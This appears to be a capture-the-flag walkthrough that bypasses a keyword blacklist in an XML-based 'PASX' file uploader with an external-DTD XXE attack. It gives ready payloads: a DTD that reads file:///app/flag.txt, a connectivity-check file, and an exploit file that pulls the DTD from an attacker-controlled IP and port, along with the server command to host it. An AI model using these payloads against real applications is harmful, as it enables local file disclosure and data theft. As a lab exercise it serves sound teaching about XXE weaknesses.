# Walkthrough: Bypassing PASX Validation to Steal the Flag

This walkthrough demonstrates how to bypass the blacklist validation in the PASX file uploader by using an **External DTD (XXE)** attack.

## Overview
The application blocks keywords like `flag`, `file`, and `etc` in the uploaded file content. However, it does not inspect the content of **external resources** fetched by the XML parser. By hosting a malicious DTD externally, we can extract the flag without ever writing the banned words in the uploaded file.

## Prerequisites
-   **Target URL**: The main page of the CTF challenge.
-   **Your IP**: `69.164.201.77`
-   **Port**: `8000` (or any open port you can listen on).

---

## Step 1: Host the Malicious DTD
You need to serve a file named `payload.dtd` so the victim server can download it.

1.  Save the `payload.dtd` file provided in this folder.
    *   **Content of payload.dtd**:
        ```xml
        <!ENTITY % data SYSTEM "file:///app/flag.txt">
        <!ENTITY content "%data;">
        ```
2.  Start a simple HTTP server on your machine to serve this file.
    ```bash
    # Run this command in the folder containing payload.dtd
    python3 -m http.server 8000
    ```
    *Ensure your firewall allows incoming connections on port 8000.*

---

## Step 2: Test Connectivity (Optional)
Before trying the exploit, verify the server can reach you.

1.  Upload `check_connection.pasx`.
    *   **Content**:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE book [
          <!ENTITY % ping SYSTEM "http://69.164.201.77:8000/ping">
          %ping;
        ]>
        <book>...</book>
        ```
2.  Check your python web server logs. You should verify a request was made for `/ping`.
    *   If you see the request, outbound traffic is enabled. Proceed to Step 3.
    *   If not, the server might be firewalled or cannot route to you.

---

## Step 3: Execute the Exploit
Now, upload the actual payload.

1.  Upload `exploit.pasx`.
    *   **Content**:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE book [
          <!ENTITY % remote SYSTEM "http://69.164.201.77:8000/payload.dtd">
          %remote;
        ]>
        <book>
          <title>&content;</title>
          ...
        </book>
        ```
2.  **What happens next**:
    *   The server parses `exploit.pasx`.
    *   It sees the external entity `%remote` pointing to your server.
    *   It fetches `http://69.164.201.77:8000/payload.dtd`.
    *   It parses `payload.dtd`, which defines `&content;` as the content of `file:///app/flag.txt`.
    *   It places the flag into the `<title>` tag of the book.
    *   It generates a PDF with that title.

3.  **Result**:
    *   The web app will display a success message with a link to a PDF.
    *   **Click the PDF link**.
    *   The **Title** of the book in the PDF will be the flag!
